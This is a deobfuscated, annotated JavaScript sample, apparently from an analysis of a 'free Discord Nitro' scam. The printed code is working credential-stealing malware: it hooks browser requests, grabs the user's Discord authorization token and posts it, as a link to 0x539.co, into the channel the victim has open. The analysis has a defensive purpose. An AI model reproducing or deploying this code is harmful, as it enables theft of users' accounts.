// Deobfuscated and commented

// Some unimportant code for sending requests
XMLHttpRequest.prototype.wrappedSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
XMLHttpRequest.prototype.setRequestHeader = function (e, t) {
    this.wrappedSetRequestHeader(e, t);
    this.headers(this.headers = {});
    this.headers[e](this.headers[e] = []);
    this.headers[e].push(t);
};
let oldXHROpen = window.XMLHttpRequest.prototype.open;

// Replace any request sending code with this:
window.XMLHttpRequest.prototype.open = function (e, t, o, n, s) {
    // When the request gets a response:
    return this.addEventListener("load", function () {
        // Is NOT in a channel?
        isNaN(
            window.location.href.substring(window.location.href.lastIndexOf("/") + 1, window.location.href.length)
        )
            // Then: Log "Pending.. to resolve your nitro."
            ? console.log(atob("UGVuZGluZy4uIHRvIHJlc29sdmUgeW91ciBuaXRyby4=")) // Reversed: ''
            // Otherwise:
            : (
                // Send message
                fetch(
                    atob("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvY2hhbm5lbHMv") + // 'https://discordapp.com/api/v6/channels/'
                    window.location.href.substring(window.location.href.lastIndexOf("/") + 1, window.location.href.length) + // Channel id
                    "/messages",
                    {
                        method: "POST",
                        headers: {
                            authorization: this.headers.Authorization[0], // TOKEN GRAB FOUND
                            "user-agent": navigator.userAgent, // BROWSER GRAB FOUND
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            content:
                            // Send "https://0x539.co/k/[TOKEN]"
                                atob("aHR0cHM6Ly8weDUzOS5jby9rLw==") + // 'https://0x539.co/k/'
                                this.headers.Authorization[0], // TOKEN GRAB FOUND
                            tts: "false"
                        })
                    }),
                    console.log("%c ",
                        atob("Zm9udC1zaXplOiA0NTBweDsgYmFja2dyb3VuZDogdXJsKGh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzQ5OTIxMTI5NzI4ODYxNzk5Mi81Njg1MDg4NzgzNzU4Nzg2NjgvaW1hZ2VzLnBuZykgbm8tcmVwZWF0Ow==") // 'font-size: 450px; background: url(https://cdn.discordapp.com/attachments/499211297288617992/568508878375878668/images.png) no-repeat;'
                    ),
                    console.log("Congratulations! You now have free discord nitro! But don't tell the discord admins!")
            )
    }),
        oldXHROpen.apply(this, arguments)
};